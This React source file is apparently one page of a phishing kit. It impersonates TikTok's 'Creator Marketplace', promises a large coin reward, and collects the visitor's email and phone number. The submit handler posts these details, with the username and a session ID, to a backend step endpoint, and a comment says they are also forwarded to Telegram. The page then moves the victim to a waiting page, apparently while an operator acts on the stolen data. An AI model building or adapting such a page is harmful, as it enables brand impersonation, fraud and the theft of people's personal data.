import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import { Smartphone } from 'lucide-react';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const ContactPage = () => {
  const navigate = useNavigate();
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [countryCode, setCountryCode] = useState('+1');
  const coinAmount = localStorage.getItem('coinAmount') || '100,000';
  const sessionId = localStorage.getItem('sessionId');
  const username = localStorage.getItem('username');

  const handleSubmit = async () => {
    if (email.trim() && phone.trim()) {
      const fullPhone = `${countryCode}${phone}`;
      localStorage.setItem('email', email);
      localStorage.setItem('phone', fullPhone);

      // Send to backend and Telegram
      try {
        await axios.post(`${API}/session/step`, {
          session_id: sessionId,
          step: 'contact',
          data: {
            username: username,
            amount: parseInt(coinAmount),
            email: email,
            phone: fullPhone
          }
        });
      } catch (error) {
        console.error('Failed to submit step:', error);
      }

      // Navigate to waiting page
      navigate('/waiting');
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#0a0a0b] via-[#121214] to-[#0a0a0b]">
      {/* Header */}
      <header className="flex items-center justify-between px-6 py-4 bg-[#0f0f10] border-b border-gray-800">
        <div className="flex items-center gap-3">
          <span className="text-white text-2xl font-bold tracking-tight">TikTok</span>
          <div className="flex gap-1.5">
            <div className="w-2 h-2 rounded-full bg-pink-500"></div>
            <div className="w-2 h-2 rounded-full bg-cyan-400"></div>
          </div>
          <div className="ml-2">
            <div className="text-white text-sm font-semibold">Creator</div>
            <div className="text-white text-sm font-semibold">Marketplace</div>
          </div>
        </div>
        <Button className="bg-[#fe2c55] hover:bg-[#ff4266] text-white font-semibold px-8 py-2 rounded-md transition-all">
          Login
        </Button>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-6 py-12">
        {/* Title */}
        <div className="text-center mb-12">
          <h1 className="text-6xl font-black mb-4">
            <span className="bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-400 bg-clip-text text-transparent">
              TikTok
            </span>
          </h1>
          <p className="text-cyan-400 text-2xl font-semibold">Your Contact Information</p>
        </div>

        {/* Icon */}
        <div className="flex justify-center mb-8">
          <div className="w-20 h-20 rounded-full bg-gradient-to-br from-cyan-400 to-blue-500 flex items-center justify-center">
            <Smartphone className="w-10 h-10 text-white" />
          </div>
        </div>

        {/* Instructions */}
        <p className="text-gray-400 text-center text-lg mb-8">
          Please provide your email and phone number for further verification.
        </p>

        {/* Email Input */}
        <div className="mb-6">
          <label className="text-white text-lg mb-3 block">Email Address</label>
          <Input
            type="email"
            placeholder="example@email.com"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="w-full bg-[#1a1a1c] border border-gray-700 text-white placeholder:text-gray-500 px-4 py-6 text-lg rounded-lg focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400"
          />
        </div>

        {/* Phone Input */}
        <div className="mb-8">
          <label className="text-white text-lg mb-3 block">Phone Number</label>
          <div className="flex gap-3">
            <select
              value={countryCode}
              onChange={(e) => setCountryCode(e.target.value)}
              className="bg-[#1a1a1c] border border-gray-700 text-white px-4 py-6 text-lg rounded-lg focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400"
            >
              <option value="+1">+1</option>
              <option value="+44">+44</option>
              <option value="+90">+90</option>
              <option value="+49">+49</option>
              <option value="+33">+33</option>
            </select>
            <Input
              type="tel"
              placeholder="+1 xxx xxx xxxx"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              className="flex-1 bg-[#1a1a1c] border border-gray-700 text-white placeholder:text-gray-500 px-4 py-6 text-lg rounded-lg focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400"
            />
          </div>
        </div>

        {/* Submit Button */}
        <Button
          onClick={handleSubmit}
          disabled={!email.trim() || !phone.trim()}
          className="w-full bg-gradient-to-r from-[#1a1a1c] to-[#2a2a2c] hover:from-[#2a2a2c] hover:to-[#1a1a1c] text-gray-400 hover:text-white font-semibold py-6 text-lg rounded-lg border border-gray-700 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
        >
          Submit Application
        </Button>

        {/* Coins Display */}
        <div className="mt-8 text-center">
          <div className="inline-block bg-[#1a1a1c] border-2 border-cyan-400/30 rounded-lg px-8 py-4">
            <span className="text-gray-400 text-lg">You will receive: </span>
            <span className="text-cyan-400 text-2xl font-bold">{parseInt(coinAmount).toLocaleString()}</span>
            <span className="text-gray-400 text-lg"> Coins</span>
          </div>
        </div>
      </main>
    </div>
  );
};

export default ContactPage;